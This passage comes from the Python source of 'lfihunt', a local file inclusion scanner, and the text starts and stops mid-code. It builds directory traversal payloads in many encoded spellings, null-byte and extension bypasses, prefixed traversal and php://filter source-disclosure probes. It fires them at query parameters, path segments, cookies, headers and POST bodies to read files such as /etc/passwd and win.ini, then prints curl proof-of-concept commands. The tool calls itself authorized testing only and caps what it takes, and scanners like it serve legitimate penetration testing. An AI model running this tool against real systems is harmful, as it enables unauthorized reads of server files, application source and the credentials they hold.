        if not self.args.no_windows:
            sets.append(("windows", TARGETS_WINDOWS))
        return sets

    # ---- request building

    def _build(self, url: str, param: str, value: str) -> str:
        """
        Replace one parameter's value, leaving every other byte untouched.

        A name that is not in the query yet is APPENDED rather than dropped:
        -p names a parameter the tester knows about, and an endpoint that
        accepts one without advertising it in the URL is the normal case. The
        previous behaviour silently produced a request identical to the
        baseline, so the point read as clean without ever being tested.
        """
        parts = urlsplit(url)
        pairs = parse_qsl(parts.query, keep_blank_values=True)
        out, seen = [], False
        for k, v in pairs:
            if k == param:
                seen = True
                out.append(f"{k}={value}")
            else:
                out.append(f"{k}={quote(v, safe='')}")
        if not seen:
            out.append(f"{quote(param, safe='')}={value}")
        return urlunsplit((parts.scheme, parts.netloc, parts.path,
                           "&".join(out), parts.fragment))

    def _build_path(self, url: str, index: int, value: str) -> str:
        """
        Replace the index-th non-empty path segment with the payload.

        The payload keeps its own slashes -- that is the point of traversal --
        and is not re-encoded here, so encoded spellings survive to the wire.
        Http.get() preserves the literal URL, without which requests would
        collapse the dot segments client-side and neuter every path payload
        before it left the machine.
        """
        parts = urlsplit(url)
        segs = parts.path.split("/")
        n = -1
        for i, s in enumerate(segs):
            if not s:
                continue
            n += 1
            if n == index:
                segs = segs[:i] + [value] + segs[i + 1:]
                break
        return urlunsplit((parts.scheme, parts.netloc, "/".join(segs),
                           parts.query, parts.fragment))

    def injection_points(self, url: str, method: str = "GET",
                         body: str | None = None):
        """
        [(kind, locator, label, build)] -- every place a payload can go.

        Query parameters first: they are cheaper to reach and more often
        vulnerable. Path segments second, and only if --no-path was not given.
        Request headers last, and only with --headers, because twelve more
        points per URL multiplies the whole budget.

        `method`/`body` carry the verb and payload-free body a header point has
        to keep, so a header sink behind a POST endpoint is still reached in
        -r mode instead of being probed with a GET the app never serves.
        """
        points = []
        qvals = dict(parse_qsl(urlsplit(url).query, keep_blank_values=True))
        for p in self.params_of(url):
            points.append(("param", p, f"param:{p}",
                           lambda v, _p=p: ("GET", self._build(url, _p, v), None),
                           qvals.get(p, "")))
        if not self.args.no_path:
            segs = [s for s in urlsplit(url).path.split("/") if s]
            for i, s in enumerate(segs):
                points.append(("path", i, f"path[{i}]:{s}",
                               lambda v, _i=i: ("GET", self._build_path(url, _i, v),
                                                None),
                               s))
        if self.args.headers:
            points.extend(self.cookie_points(url, method, body))
            skip = self.http.auth.names_for(url) if self.http.auth else set()
            held = [h for h in INJECTABLE_HEADERS if h.lower() in skip]
            if held:
                self.con.info(f"  {len(held)} header(s) held back — supplied "
                              f"by an auth file")
            for h in [h for h in INJECTABLE_HEADERS if h.lower() not in skip]:
                # The payload REPLACES the header value rather than being
                # appended to it. That is the opposite of what an SQL or XSS
                # payload wants, and it is right here: the value is used as a
                # filename, so "Mozilla/5.0...../../etc/passwd" resolves to
                # nothing at all.
                points.append(("header", h, f"header:{h}",
                               lambda v, _h=h: (method, url, body, {_h: v}),
                               ""))
        return points

    def cookie_points(self, url: str, method: str = "GET",
                      body: str | None = None) -> list:
        """
        One point per cookie carried by -H or by the captured request.

        A cookie is as good a filename sink as a query parameter and a much
        quieter one -- a language or theme cookie pasted into a template path
        is the classic shape. Cookie IS a request header, so it follows the
        same rule as the others and waits for --headers; naming one with
        -p cookie:NAME tests it on its own.

        Tested ONE AT A TIME with the rest of the jar replayed untouched: the
        payload replaces one value, and dropping the session cookie alongside
        it would cost the very access the read needs.
        """
        if getattr(self.args, "no_cookies", False):
            return []
        full = parse_cookie_header(self.http.header_for(url, "Cookie"))
        # Nothing an auth file supplies is injected: the payload would replace
        # the credential and every later request would run unauthenticated,
        # which looks exactly like a target with nothing to find. -p overrides
        # this, name by name.
        held = self.http.auth.cookies_for(url) if self.http.auth else set()
        jar = {k: v for k, v in full.items() if k not in held}
        if held & set(full):
            self.con.info(f"  {len(held & set(full))} cookie(s) held back — "
                          f"supplied by an auth file; name one with -p to "
                          f"test it anyway")
        if not jar:
            return []
        self.con.debug(f"  {len(jar)} cookie(s) to test one at a time: "
                       f"{', '.join(jar)}")
        out = []
        for name, value in jar.items():
            def build(v, _n=name, _j=dict(jar)):
                j = dict(_j)
                j[_n] = v
                return (method, url, body, {"Cookie": build_cookie_header(j)})
            out.append(("cookie", name, f"cookie:{name}", build, value))
        return out

    def _build_body(self, params: dict, param, value: str) -> str:
        """
        Serialise a form body with one parameter's value replaced by the raw
        payload (kept literal so encoded traversals survive), the rest quoted.
        param=None quotes every field -> the untouched baseline body.
        """
        out = []
        for k, v in params.items():
            out.append(f"{k}={value}" if k == param else f"{k}={quote(v, safe='')}")
        return "&".join(out)

    def _curl(self, desc) -> str:
        """Reproduce an injection descriptor as a curl command."""
        method, url, data = desc[0], desc[1], desc[2]
        hdrs = desc[3] if len(desc) > 3 else None
        if data is None:
            c = f"curl -sk '{url}'" if method == "GET" else f"curl -sk -X {method} '{url}'"
        else:
            c = f"curl -sk -X {method} '{url}' --data '{data}'"
        sets_cookie = any(k.lower() == "cookie" for k in (hdrs or {}))
        for k, v in (hdrs or {}).items():
            # a cookie point already carries the whole jar, payload included
            c += (f" -b '{v}'" if k.lower() == "cookie" else f" -H '{k}: {v}'")
        if self._poc_cookie and not sets_cookie:
            c += f" -b '{self._poc_cookie}'"
        return c

    def params_of(self, url: str) -> list[str]:
        parts = urlsplit(url)
        found = [k for k, _ in parse_qsl(parts.query, keep_blank_values=True)]
        real = [p for p in found if p.lower() not in NOISE_PARAMS]
        dropped = len(found) - len(real)
        if dropped:
            self.con.debug(f"  dropped {dropped} tracking parameter(s)")
        return real

    def wanted_params(self) -> list:
        """Specs given with -p. An empty list means 'test everything'."""
        return parse_param_specs(getattr(self.args, "param", None) or "")

    def _make_point(self, sp: ParamSpec, url: str, method: str,
                    body: str | None):
        """
        Build the point for a -p name the request does not already carry.

        Not an error and not an empty scan: an endpoint that accepts a
        parameter without advertising it is the normal case, and a cookie or
        header worth testing is often one the capture happens not to include.
        The prefix says what to build; without one, a name in the header list
        or carrying a dash is a header -- no query parameter is called
        X-Forwarded-For -- and anything else is a query parameter.
        """
        known = {h.lower(): h for h in INJECTABLE_HEADERS}
        kind = sp.kind or ("header" if (sp.key in known or "-" in sp.key)
                           else "param")

        if kind == "header":
            h = known.get(sp.key, sp.name)
            self.con.info(f"  -p: testing request header {h} "
                          f"(--headers not needed for a header named here)")
            return ("header", h, f"header:{h}",
                    lambda v, _h=h: (method, url, body, {_h: v}), "")

        if kind == "cookie":
            jar = parse_cookie_header(self.http.header_for(url, "Cookie"))
            jar.setdefault(sp.name, "1")
            self.con.info(f"  -p: cookie '{sp.name}' is not in the request — "
                          f"sending it anyway")

            def build(v, _n=sp.name, _j=dict(jar)):
                j = dict(_j)
                j[_n] = v
                return (method, url, body, {"Cookie": build_cookie_header(j)})
            return ("cookie", sp.name, f"cookie:{sp.name}", build,
                    jar[sp.name])

        if kind == "body":
            self.con.info(f"  -p: body parameter '{sp.name}' is not in the "
                          f"request — adding it")
            fields = dict(self._body_params or {})
            fields.setdefault(sp.name, "1")
            return ("body", sp.name, f"body:{sp.name}",
                    lambda v, _p=sp.name, _f=dict(fields):
                        (method if method != "GET" else "POST", url,
                         self._build_body(_f, _p, v)),
                    fields[sp.name])

        self.con.info(f"  -p: query parameter '{sp.name}' is not on the target "
                      f"— adding it to the query string")
        return ("param", sp.name, f"param:{sp.name}",
                lambda v, _p=sp.name: ("GET", self._build(url, _p, v), None),
                "")

    def only_wanted(self, points: list, url: str, method: str = "GET",
                    body: str | None = None) -> list:
        """Keep the points -p named, creating the ones that do not exist yet."""
        specs = self.wanted_params()
        if not specs:
            return points
        kept, taken = [], set()
        for sp in specs:
            found = [p for p in points if sp.matches(p)]
            if not found:
                kept.append(self._make_point(sp, url, method, body))
                continue
            for p in found:
                if id(p) not in taken:
                    taken.add(id(p))
                    kept.append(p)
        dropped = len(points) - len(taken)
        if dropped > 0:
            self.con.info(f"  -p: {dropped} other injection point(s) skipped")
        return kept

    # ---- detection

    def _matches(self, body: str, tgt: dict) -> bool:
        return bool(tgt["re"].search(body or ""))

    def _reflected(self, body: str, payload: str) -> bool:
        """
        The payload appearing verbatim means the app echoed it. That is
        reflection, not inclusion, and is the classic false positive.
        """
        probe = payload.replace("%00", "")[:60]
        return bool(probe) and probe in (body or "")

    def _drive(self, url: str, points: list, baseline: Resp):
        """
        Test every point, stopping once --confirm-x of them are confirmed.

        One confirmed read is usually enough to write the report; proving the
        same inclusion through a fourth parameter of the same page buys
        nothing and the budget is better spent on the next host. 0 disables it.
        """
        limit = max(0, getattr(self.args, "confirm_x", 0) or 0)
        hits = 0
        for i, pt in enumerate(points):
            try:
                if self.test_point(url, pt, baseline):
                    hits += 1
                    if limit and hits >= limit:
                        left = len(points) - i - 1
                        if left > 0:
                            self.con.info(
                                f"{hits} finding(s) confirmed >= --confirm-x "
                                f"({limit}) — {left} remaining point(s) "
                                f"skipped on this URL")
                        return
            except Exception as e:
                self.con.error(f"{url} [{pt[2]}]: {type(e).__name__}: {e}")

    def test_point(self, url: str, point, baseline: Resp):
        """Walk depths and spellings for one injection point until it reads."""
        kind, _loc, label, build = point[:4]
        for os_label, targets in self.target_sets():
            for tgt in targets:
                if self._try_target(url, point, baseline, os_label, tgt):
                    return True
        return self._try_php_filter(url, point, baseline)

    def _try_target(self, url, point, baseline, os_label, tgt) -> bool:
        kind, _loc, label, build = point[:4]
        order = spellings_for(kind)
        lead = [order[0][0], order[1][0]]      # full suffix matrix on these two
        sfx_all = self._suffixes(url, point)

        # A Windows drive payload is already absolute: it carries neither a
        # traversal prefix nor a depth, so the spelling and depth loops changed
        # nothing about it and sent the SAME request 130 times per drive.
        if tgt.get("drives"):
            for drive in ("C:/", "D:/"):
                for sfx_label, sfx in sfx_all:
                    if self._one(url, point, drive + tgt["file"] + sfx,
                                 baseline, tgt, os_label, "drive", 0,
                                 sfx_label):
                        return True
            return False

        # Prefixed traversal: for an application that checks the START of the
        # path. Tried before the bare sweep because its best candidate is not a
        # guess -- it is the directory the parameter's own value carries.
        prefixes = ([] if getattr(self.args, "no_prefix", False)
                    else self._prefix_candidates(url, point, baseline))
        for prefix, why in prefixes:
            climb = ("..\\" if "\\" in prefix else "../") * PREFIX_CLIMB
            f = tgt["file"].replace("/", "\\") if "\\" in prefix else tgt["file"]
            for sfx_label, sfx in (sfx_all if why == "value"
                                   else sfx_all[:1]):
                if self._one(url, point, prefix + climb + f + sfx, baseline,
                             tgt, os_label, f"prefix:{why}", 0, sfx_label):
                    return True

        # Absolute path: the simplest form that can work, so it is also the one
        # the report should name when it does.
        seen_sep = set()
        for spell, _prefix in order:
            sep = ROOT_SEP.get(spell, "/")
            if sep in seen_sep:
                continue
            seen_sep.add(sep)
            sfx_list = sfx_all if sep == "/" else sfx_all[:1]
            for sfx_label, sfx in sfx_list:
                if self._one(url, point, sep + tgt["file"] + sfx, baseline,
                             tgt, os_label, f"absolute/{spell}", 0, sfx_label):
                    return True

        for depth in range(1, self.args.depth + 1):
            for spell, prefix in order:
                # Suffix handling is a property of the application (does it
                # append ".html"?), not of the traversal spelling, so the full
                # cross-product is redundant. Run every suffix against the two
                # most likely spellings for this mode, and bare against the
                # rest: same coverage, a third of the requests.
                sfx_list = (sfx_all if spell in lead else sfx_all[:1])
                for sfx_label, sfx in sfx_list:
                    payload = prefix * depth + tgt["file"] + sfx
                    if self._one(url, point, payload, baseline, tgt,
                                 os_label, spell, depth, sfx_label):
                        return True
        return False

    def _suffixes(self, url: str, point) -> list:
        """
        The extension defeats for this point, with the target's own extension
        appended after the null byte.

        A bare %00 defeats an application that only truncates. It does NOT
        defeat one that checks the extension first, because
        ../../../etc/passwd%00 does not end in anything it serves -- measured
        on a replica: %00 refused, %00.png read the file. What has to follow
        the NUL is an extension the endpoint accepts, and there is no need to
        guess a thousand of them: the request already carries one. Falls back
        to the extensions of the sibling values when the tested parameter has
        none of its own.
        """
        out = list(SUFFIX_TRICKS)
        exts, seen = [], set()

        def add(v):
            e = ext_of(v or "")
            if e and e.lower() not in seen and len(exts) < 2:
                seen.add(e.lower())
                exts.append(e)

        add(point[4] if len(point) > 4 else "")
        if not exts:
            for _k, v in parse_qsl(urlsplit(url).query, keep_blank_values=True):
                add(v)
        for e in exts:
            out.append((f"null-byte{e}", "%00" + e))
        if exts:
            self.con.debug(f"  extension taken from the request: "
                           f"{', '.join(exts)}")
        return out

    def _prefix_candidates(self, url: str, point, baseline: Resp) -> list:
        """
        Directories worth putting in front of a traversal, best first.

        All of them come from the target. The value being replaced is the
        strongest source there is -- an endpoint called with
        filename=/var/www/images/65.jpg has just said where it serves from --
        then any sibling value in the same request that is shaped like a path,
        then any path the application printed in a response, including the one
        it prints when asked for a file that does not exist. Nothing is
        guessed, so a prefix that works is a prefix the application named.

        Cached per point: the discovery costs one request and the result is the
        same for every target file.
        """
        key = (url, point[0], str(point[1]))
        if key in self._prefix_cache:
            return self._prefix_cache[key]

        out, seen = [], set()

        def add(raw: str, why: str):
            if not looks_like_path(raw or ""):
                return
            p = dir_of(raw)
            if not p or p in seen or p in ("/", "\\", "./", "../"):
                return
            seen.add(p)
            out.append((p, why))

        # 1. the value this point replaces
        add(point[4] if len(point) > 4 else "", "value")

        # 2. every other value travelling in the same request
        for k, v in parse_qsl(urlsplit(url).query, keep_blank_values=True):
            add(v, "sibling")

        # 3. anything path-shaped the application printed back, including in
        #    its reply to a filename that cannot exist -- which is where an
        #    application most often names the directory it tried
        bodies = [(baseline.body or "")[:20000]]
        build = point[3]
        probe = self.http.send(*build(self.CONTROL))
        self._probe()
        if probe.ok:
            bodies.append((probe.body or "")[:20000])
        for body in bodies:
            for rx in (_ABS_DIR_RX, _WIN_DIR_RX):
                for m in rx.finditer(body):
                    add(m.group(1), "printed")
                    if len(out) >= 8:
                        break

        out = out[:8]
        self._prefix_cache[key] = out
        if out:
            self.con.debug("  path prefixes discovered: "
                           + ", ".join(f"{p} ({w})" for p, w in out))
        return out

    def _one(self, url, point, payload, baseline, tgt, os_label,
             spelling, depth, sfx_label) -> bool:
        kind, _loc, label, build = point[:4]
        param = label
        desc = build(payload)                 # (method, url, data)
        r = self.http.send(*desc)
        self._probe()
        hit = r.ok and self._matches(r.body, tgt)
        note = f"{os_label}/{spelling}" + ("" if depth == 0 else f"/d{depth}")
        if sfx_label != "none":
            note += f"/{sfx_label}"
        self.con.test(urlsplit(url).netloc, f"{param}={tgt['label']}",
                      r.status if r.ok else "err",
                      note + ("  MATCH" if hit else ""))
        if not hit:
            return False

        # --- gate 1: reflection, not inclusion
        if self._reflected(r.body, payload):
            self.con.debug(f"  {param}: signature present but payload echoed "
                           f"back — reflection, not inclusion")
            return False

        # --- gate 2: baseline already contained the signature
        if self._matches(baseline.body, tgt):
            self.con.debug(f"  {param}: baseline already matches {tgt['label']} "
                           f"— signature is part of the page, not a read")
            return False

        # --- gate 3: a nonexistent file must NOT match
        # route the control through the SAME injection point (query, path or
        # body) so the negative test exercises exactly what the hit did
        ctrl_payload = payload.replace(tgt["file"], self.CONTROL)
        c = self.http.send(*build(ctrl_payload))
        self._probe()
        if c.ok and self._matches(c.body, tgt):
            self.con.debug(f"  {param}: control ({self.CONTROL}) also matches "
                           f"— the page returns this content regardless")
            return False

        # --- gate 4: replay, to rule out a one-off
        r2 = self.http.send(*desc)
        self._probe()
        if not (r2.ok and self._matches(r2.body, tgt)):
            self.con.debug(f"  {param}: did not reproduce on replay")
            return False

        proof = self._exfil(r2.body, tgt)
        self.add(Finding(
            title=f"Local File Inclusion — {tgt['label']} read via '{param}'",
            url=url, param=param, sev=CRIT,
            evidence=(f"os={os_label}  spelling={spelling}  "
                      f"depth={'no traversal depth (absolute or prefixed)' if depth == 0 else depth}"
                      f"  suffix={sfx_label}\n"
                      f"payload={payload}\n"
                      f"Verified: signature matched, payload not reflected, "
                      f"baseline clean, nonexistent-file control negative, "
                      f"reproduced on replay."),
            proof=proof,
            curl=self._curl(desc)))
        return True

    def _try_php_filter(self, url, point, baseline) -> bool:
        """
        php://filter returns the source of the including script itself,
        base64-encoded. Proof is the decoded blob starting with PHP source --
        a signature the payload cannot fake.
        """
        if self.args.no_linux:
            return False
        kind, _loc, label, build = point[:4]
        for res in ("index.php", "index", os.path.basename(urlsplit(url).path)):
            if not res:
                continue
            payload = PHP_FILTER + res
            desc = build(payload)
            r = self.http.send(*desc)
            self._probe()
            blob = self._b64_source(r.body if r.ok else "")
            self.con.test(urlsplit(url).netloc, f"{label}=php://filter:{res}",
                          r.status if r.ok else "err",
                          "SOURCE" if blob else "")
            if not blob:
                continue
            self.add(Finding(
                title=f"Local File Inclusion — PHP source disclosure via {label}",
                url=url, param=label, sev=CRIT,
                evidence=(f"payload={payload}\n"
                          f"Response contained a base64 blob decoding to PHP "
                          f"source. The application discloses its own code, "
                          f"which commonly carries database credentials."),
                proof=blob,
                curl=self._curl(desc)))
            return True
        return False

    def _b64_source(self, body: str) -> str:
        # 40 chars, not 80: a small config or a short index.php base64-encodes
        # to well under 80 and would be missed. The decode-and-check below is
        # what discriminates, so a lower threshold costs nothing but a few
        # wasted decodes.
        for m in re.finditer(r"[A-Za-z0-9+/]{40,}={0,2}", body or ""):
            # re-pad from scratch: appending "==" to an already-padded blob
            # raises binascii.Error and would swallow a real hit
            s = m.group(0).rstrip("=")
            try:
                dec = base64.b64decode(s + "=" * (-len(s) % 4), validate=False)
            except Exception:
                continue
            txt = dec.decode("utf-8", "replace")
            if "<?php" in txt or "<?=" in txt:
                return self._cap(txt)
        return ""

    # ---- exfiltration, capped

    def _exfil(self, body: str, tgt: dict) -> str:
        """
        Proof of read: the matched region only, capped hard. Enough for a
        report to be believed, not enough to be a data breach in itself.
        """
        m = tgt["re"].search(body or "")
        if not m:
            return ""
        start = max(0, m.start() - 64)
        return self._cap(body[start:start + EXFIL_MAX_BYTES])

    @staticmethod
    def _cap(text: str) -> str:
        text = text.replace("\r", "")
        lines = [ln for ln in text.split("\n") if ln.strip()][:EXFIL_MAX_LINES]
        out = "\n".join(lines)[:EXFIL_MAX_BYTES]
        return out + ("\n  … truncated (proof only) …"
                      if len(text) > len(out) else "")

    # ---- driver

    def _claim(self, url: str, kind: str, locator) -> bool:
        """
        True the first time an injection point is seen, False afterwards.

        The key uses the NORMALISED path, so /product/123/detail and
        /product/456/detail are one template and get tested once. Without that,
        a list of a few hundred URLs off one site re-runs the same 1300-payload
        matrix against the same route dozens of times over.
        """
        parts = urlsplit(url)
        key = (parts.netloc.lower(), normalise_path(parts.path),
               kind, str(locator))
        with self._lk:
            if key in self._seen:
                self.deduped += 1
                return False
            self._seen.add(key)
            return True

    def run_target(self, url: str):
        self.con.banner(f"Testing {url}")
        if "://" not in url:
            url = "https://" + url

        points = self.only_wanted(self.injection_points(url), url)
        if not points:
            self.skipped.append({"url": url, "reason": "no injection point"})
            self.con.skip(f"{url} — nothing to inject into "
                          f"(no parameter, no path segment)")
            return

        fresh = [pt for pt in points if self._claim(url, pt[0], pt[1])]
        if not fresh:
            self.con.skip(f"{url} — all {len(points)} injection point(s) "
                          f"already tested on this route template")
            return

        baseline = self.http.get(url)
        if not baseline.ok:
            self.skipped.append({"url": url, "reason": baseline.error[:70]})
            self.con.skip(f"{url} — no response ({baseline.error[:50]})")
            return

        dupes = len(points) - len(fresh)
        self.con.info(f"{len(fresh)} injection point(s): "
                      + ", ".join(pt[2] for pt in fresh)
                      + (f"  ({dupes} already tested, skipped)" if dupes else ""))

        self._drive(url, fresh, baseline)

    def run_request(self, spec: "RequestSpec"):
        """
        Scan driven by a raw HTTP request (-r).

        Same vectors and same options as run_target -- query parameters and, if
        --no-path was not given, path segments -- plus the request's POST body
        parameters, a prime LFI sink that a URL-only scan cannot reach. The
        request's headers (Cookie...) are already merged into the Http client by
        main(), so they are replayed on every request; the baseline is fetched
        with the request's own verb and body.
        """
        url = spec.url
        self.con.banner(f"Testing (raw request) {spec.method} {url}")

        points = self.injection_points(
            url, spec.method,
            self._build_body(spec.body_params, None, "") if spec.body_params
            else None)
        if spec.body_params and self.args.no_post:
            self.con.info(f"body {spec.method} params ignored (--no-post): "
                          f"{list(spec.body_params)}")
        elif spec.body_params:
            self.con.info(f"body {spec.method} params: {list(spec.body_params)}")
            for bp in spec.body_params:
                points.append(("body", bp, f"body:{bp}",
                               lambda v, _p=bp: (spec.method, url,
                                                 self._build_body(spec.body_params,
                                                                  _p, v)),
                               spec.body_params.get(bp, "")))
        self._body_params = dict(spec.body_params or {})
        points = self.only_wanted(
            points, url, spec.method,
            self._build_body(spec.body_params, None, "") if spec.body_params
            else None)
        if not points:
            self.skipped.append({"url": url, "reason": "no injection point"})
            self.con.skip(f"{url} — nothing to inject into "
                          f"(no parameter, path segment or body param)")
            return

        fresh = [pt for pt in points if self._claim(url, pt[0], pt[1])]
        if not fresh:
            self.con.skip(f"{url} — all {len(points)} injection point(s) "
                          f"already tested on this route template")
            return

        base_body = (self._build_body(spec.body_params, None, None)
                     if spec.body_params and spec.method != "GET" else None)
        baseline = self.http.send(spec.method, url, data=base_body)
        if not baseline.ok:
            self.skipped.append({"url": url, "reason": baseline.error[:70]})
            self.con.skip(f"{url} — no response ({baseline.error[:50]})")
            return

        self.con.info(f"{len(fresh)} injection point(s): "
                      + ", ".join(pt[2] for pt in fresh))
        self._drive(url, fresh, baseline)


# ----------------------------------------------------------------------------
# cli
# ----------------------------------------------------------------------------

BANNER = r"""
  lfihunt — local file inclusion testing
  authorized testing only
"""

EPILOG = """
authentication
  Most of an application's surface sits behind a login. --auth-file takes one
  file of headers (the -H syntax, '#' for comments) and applies it to every
  target whatever it is called; --auth-dir takes a directory of files named
  after the host they authenticate -- www.example.com.txt for every port of
  that host, www.example.com_8080.txt for that port only, which wins over it.
  The two are mutually exclusive. There is no subdomain inheritance: a file for
  example.com does not authenticate app.example.com, because credentials that
  follow a wildcard land on whatever subdomain happens to resolve, including
  one that has been taken over.

  This is also what -H cannot do. -H feeds one header dict shared by every
  target, so in -l mode a session given that way reaches every host in the
  list. The auth table is keyed by (host, port) and resolved per request, which
  is what makes it correct under -t.

  Priority, lowest first: the captured request (-r), the auth file, then -H.
  Cookie is merged cookie by cookie along that order rather than replaced, so a
  TrackingId from a capture survives a session= from an auth file. Nothing an
  auth file supplies is injected -- the payload would replace the credential
  and everything after it would run unauthenticated, which looks exactly like a
  clean target -- unless -p names it: -p cookie:session or -p header:User-Agent
  test it anyway. Credentials appear as-is in the PoC and at -v 2, so the curl
  in a report is copy-paste reproducible.

injection points
  Query parameters and path segments by default; POST body parameters in -r
  mode. Request headers, cookies included, only with --headers -- or one at a
  time by naming it with -p, which needs no flag. Cookies are tested ONE AT A
  TIME with the rest of the jar replayed intact, because the payload replaces
  a value and dropping the session cookie alongside it would cost the very
  access the read needs. A cookie is as good a filename sink as a query
  parameter and a quieter one: the code that reads a 'lang' or 'theme' cookie
  into a template path does not look like input handling at all.

payload shapes
  Prefixed traversal first, then absolute path, then bare traversal.

  An application can validate that the filename STARTS WITH the directory it
  serves from, and then neither a bare absolute path nor a bare traversal gets
  through: the payload has to carry that prefix and climb out of it,
  /var/www/images/../../../etc/passwd. Every prefix tried is one the TARGET
  produced -- the value being replaced, a sibling value in the same request,
  or a path the application printed back, including in its reply to a filename
  that cannot exist, which is where an application most often names the
  directory it tried. There is no list of conventional web roots: a guessed
  /var/www/html/ that happens to work reads exactly like a discovered one in a
  report, and one that does not is spent budget. Where the prefix came from is
  named in the finding (prefix:value, prefix:sibling, prefix:printed). An
  application that validates the start of the path AND names it nowhere is
  therefore out of reach, and says so by finding nothing. One climb depth
  covers every base, because ".." at the root is a no-op.

  Absolute path next, then traversal.

  Each of those carries the extension defeats -- %00, ?, #, ; -- on the two
  spellings most likely to work in that position. The null byte comes in two
  forms: bare, for an application that only truncates, and followed by the
  extension THIS request already carries, for one that checks the extension
  before truncating. ../../../etc/passwd%00 is refused there and
  ../../../etc/passwd%00.jpg is not, and the .jpg is read off the endpoint
  rather than drawn from a list. A read needs no "../" when the
  application hands the value straight to open(): /etc/passwd IS the payload,
  and it is the only thing that works on an application that rejects "..",
  which is a whole family of targets. Then ../ at depths 1 to --depth, in ten
  spellings (encoded, doubly encoded, non-recursively stripped, overlong
  UTF-8...), each with the extension defeats (%00, ?, #, ;) on the two
  spellings most likely to work in that position. Windows drive payloads are
  already absolute and are sent once per drive rather than once per
  (depth, spelling).

why signatures, not reflection
  The commonest false LFI report is an app that echoes its input. A response
  containing "../../../etc/passwd" proves only that the string came back. Every
  candidate here must produce structure the payload never contained -- a passwd
  line matched by regex, a win.ini section header, base64 that decodes to PHP --
  and must then pass four gates:

    1. the payload must NOT appear verbatim in the response  (reflection)
    2. the baseline response must NOT already match          (page content)
    3. a nonexistent-file control must NOT match             (catch-all page)
    4. the hit must reproduce on replay                      (one-off/cache)

  A candidate failing any gate is dropped, and says so at -v 2.

os targeting
  --no-windows and --no-linux gate the payload family. Nothing else consults
  them, so a disabled family cannot re-enter through another code path. Passing
  both is refused: there would be nothing left to send.

exfiltration
  Capped deliberately. On a confirmed read the tool keeps the matched region
  only -- at most 12 lines / 1024 bytes -- and stops. It does not walk the
  filesystem, does not try /etc/shadow, and does not collect application
  secrets beyond the single php://filter source-disclosure proof. Proving the
  read is the finding.

injection points
  Both query parameters AND path segments are tested. Modern LFI lives in
  routes as often as in parameters -- /download/report.pdf becomes
  /download/../../../etc/passwd -- and a parameters-only tool declines every
  URL that has no query string at all.

  The traversal spelling order differs by position, and this matters. In a
  query value plain "../" reaches the application intact, so it is tried first
  and the report names the simplest working form. In a path segment it usually
  does not: Apache, nginx and most proxies collapse dot segments during request
  normalisation, before the application sees them. Path mode therefore leads
  with the encoded spellings, which survive. Testing "../" first in a path
  mostly measures the proxy rather than the app.

  --no-path restricts testing to query parameters. Path testing multiplies the
  request count by the number of segments, so it is worth using on a wide sweep.

parameters
  Tracking parameters (gclid, gbraid, fbclid, utm_*, msclkid ...) never reach a
  filesystem read and are dropped automatically. Nothing is guessed: a
  parameter name that is not in the request is tested only when -p names it,
  because a sweep over invented names costs thousands of requests per URL and
  every one of them tests something that does not exist -- measured on one
  target with no query string of its own, twenty guessed names spent 24901
  requests while -p cookie:lang found the read in 5.

repeated routes
  Injection points already tested are not tested again, keyed on the NORMALISED
  path: identifier-looking segments (numeric, UUID, hex, date) collapse to
  placeholders, so /product/123/detail and /product/456/detail are recognised
  as one route template and tested once. Without that, a few hundred URLs off
  one site re-run the same payload matrix against the same route repeatedly.
  The skipped count prints per target and in the summary.

colour
  On by default. Disable with --no-color or NO_COLOR=1.

status line
  In -l mode a heartbeat prints every 30s (--status-interval) at any verbosity.
  Not shown for -u.

examples
  lfihunt.py -u 'https://target/page.php?file=home'
  lfihunt.py -u 'https://target/p?id=1' --no-windows -v 1
  lfihunt.py -l urls.txt --status-interval 15
  lfihunt.py -l urls.txt --param file,page --depth 10
  lfihunt.py -r request.txt -v 1
  lfihunt.py -r request.txt --no-windows --force-ssl
"""


def build_parser():
    p = argparse.ArgumentParser(
        prog="lfihunt.py", description=BANNER, epilog=EPILOG,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-v", type=int, default=0, choices=[0, 1, 2], dest="verbosity",
                   help="0 = confirmed findings only (default), 1 = every test, "
                        "2 = debug (shows why candidates were rejected)")
    p.add_argument("-u", "--url", help="single target URL")
    p.add_argument("-l", "--list", help="file of target URLs, one per line")
    p.add_argument("-r", "--request", metavar="FILE",
                   help="raw HTTP request file (Burp/ZAP export): method, "
                        "headers (Cookie...) and body are replayed, and injection "
                        "follows the usual vectors (query params, path segments, "
                        "POST body params) per the existing --no-path/--param/... "
                        "options")
    p.add_argument("--force-ssl", action="store_true",
                   help="force https for a -r request (default: http, inferred "
                        "from Origin/Referer)")
    p.add_argument("--no-color", action="store_true",
                   help="disable coloured output (colour is on by default)")
    p.add_argument("--status-interval", type=float, default=30.0, metavar="SEC",
                   help="seconds between status lines in -l mode (default 30)")
    p.add_argument("--no-windows", action="store_true",
                   help="skip Windows payloads (win.ini, boot.ini, drive walk)")
    p.add_argument("--no-linux", action="store_true",
                   help="skip Linux payloads (/etc/passwd, /proc/self/environ, "
                        "php://filter)")
    p.add_argument("--no-cookies", action="store_true",
                   help="with --headers, test the listed headers but not the "
                        "cookies")
    p.add_argument("--no-prefix", action="store_true",
                   help="skip the prefixed-traversal family (for an app that "
                        "validates the START of the path)")
    p.add_argument("--version", action="version",
                   version=f"%(prog)s {VERSION}")
    p.add_argument("--depth", type=int, default=MAX_DEPTH, metavar="N",
                   help=f"maximum ../ depth (default {MAX_DEPTH})")
    p.add_argument("--no-path", action="store_true",
                   help="skip URL path segments, test query parameters only "
                        "(path testing multiplies request count by the number "
                        "of segments)")
    p.add_argument("--no-post", action="store_true",
                   help="skip POST body parameters in -r mode (test only query "
                        "params and path segments)")
    p.add_argument("-p", "--param", metavar="NAME",
                   help="only test the injection points named here, "
                        "comma-separated. A bare name matches wherever it is "
                        "found; prefix it to say where: query: (or get:, url:), "
                        "body: (or post:, data:), cookie:, header: — e.g. "
                        "'-p cookie:TrackingId,query:id'. A header named this "
                        "way is tested without --headers. A name the request "
                        "does not carry is created in the place the prefix "
                        "says (query string when there is none), so a "
                        "parameter you know about but that is not in the "
                        "capture can still be reached")
    p.add_argument("--headers", action="store_true",
                   help=f"also inject into request headers, in every mode "
                        f"including -r: the {len(INJECTABLE_HEADERS)} listed "
                        f"ones (User-Agent, Referer, X-Forwarded-For, ...) and "
                        f"every cookie the request carries, one at a time. Off "
                        f"by default because it multiplies the request budget "
                        f"by the number of headers; -p header:NAME or "
                        f"-p cookie:NAME tests one of them without this flag")
    p.add_argument("--confirm-x", type=int, default=3, metavar="N",
                   help="stop testing a URL once N findings are confirmed "
